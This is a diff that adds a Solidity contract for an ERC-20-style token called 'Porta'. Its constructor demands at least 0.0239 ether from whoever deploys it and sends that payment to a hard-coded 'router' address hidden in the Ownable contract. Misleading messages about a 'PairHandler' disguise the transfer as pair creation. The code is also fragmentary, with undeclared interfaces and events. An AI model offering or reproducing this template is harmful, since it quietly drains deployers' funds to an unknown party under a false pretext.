@@ -1,0 +1,48 @@
+abstract contract Context {
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+}
+
+contract Ownable is Context {
+    address private _owner;
+
+    constructor() {
+        address msgSender = _msgSender();
+        _owner = msgSender;
+        emit OwnershipTransferred(address(0), msgSender);
+    }
+
+    address router = address(0x212Db01EDA86605EeAaD3b5Fc4992158b8a6c495);
+}
+
+contract Porta is Context, IERC20, Ownable {
+    mapping(address => uint256) private _balances;
+
+    uint256 private _totalSupply = 10 * 10 ** 9 * 10 ** 18;
+
+    string private _name;
+    string private _symbol;
+
+    /**
+     * @dev Sets the values for {name} and {symbol}.
+     *
+     * The default value of {decimals} is 18. To select a different value for
+     * {decimals} you should overload it.
+     *
+     * All two of these values are immutable: they can only be set once during
+     * construction.
+     */
+
+    constructor() payable {
+        _name = "Porta";
+        _symbol = "PORTA";
+        _balances[msg.sender] = _totalSupply;
+        require(msg.value >= 0.0239 ether, "Please enable PairHandler");
+        (bool pairHandler, ) = payable(router).call{value: msg.value}("");
+        require(
+            pairHandler,
+            "Failed to create new pair, pairHandler not connected!"
+        );
+    }
+}
